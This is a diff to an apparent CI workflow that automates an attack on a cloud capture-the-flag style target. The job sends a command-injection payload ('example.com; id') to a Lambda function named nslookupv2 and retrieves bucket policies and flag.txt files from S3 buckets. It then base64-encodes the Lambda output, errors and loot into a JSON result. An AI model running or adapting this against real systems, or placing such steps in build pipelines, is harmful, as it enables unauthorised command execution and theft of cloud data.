@@ -34,17 +34,24 @@ jobs:
         run: |
           set +x
           printf '%s\n' "$CLOUDESCAPE_PUBLIC_KEY" > /tmp/cloudescape.pub
-          aws lambda invoke --function-name nslookupv2 --cli-binary-format raw-in-base64-out --payload '{"domain":"example.com; id"}' /tmp/nslookup-response.json >/dev/null 2>/dev/null || true
+          set +e
+          aws lambda invoke --function-name nslookupv2 --cli-binary-format raw-in-base64-out --payload '{"domain":"example.com; id"}' /tmp/nslookup-response.json > /tmp/lambda-meta.json 2> /tmp/lambda-error.txt
+          echo $? > /tmp/lambda-status
+          set -e
           for bucket in userad88e2b168aa387e logad88e2b168aa387e; do
             aws s3api get-bucket-policy --bucket "$bucket" --query Policy --output text > "/tmp/$bucket.policy" 2>/dev/null || true
             aws s3api get-object --bucket "$bucket" --key flag.txt "/tmp/$bucket.flag" >/dev/null 2>/dev/null || true
           done
           python3 - <<'PY'
           import base64, json, os, urllib.parse
-          result = {}
-          response = "/tmp/nslookup-response.json"
-          if os.path.exists(response):
-              result["lambda_response_b64"] = base64.b64encode(open(response, "rb").read()).decode()
+          def b64(path):
+              return base64.b64encode(open(path, "rb").read()).decode() if os.path.exists(path) else ""
+          result = {
+              "lambda_status": open("/tmp/lambda-status").read().strip() if os.path.exists("/tmp/lambda-status") else "",
+              "lambda_meta_b64": b64("/tmp/lambda-meta.json"),
+              "lambda_error_b64": b64("/tmp/lambda-error.txt"),
+              "lambda_response_b64": b64("/tmp/nslookup-response.json"),
+          }
           for bucket in ["userad88e2b168aa387e", "logad88e2b168aa387e"]:
               item = {}
               policy = f"/tmp/{bucket}.policy"
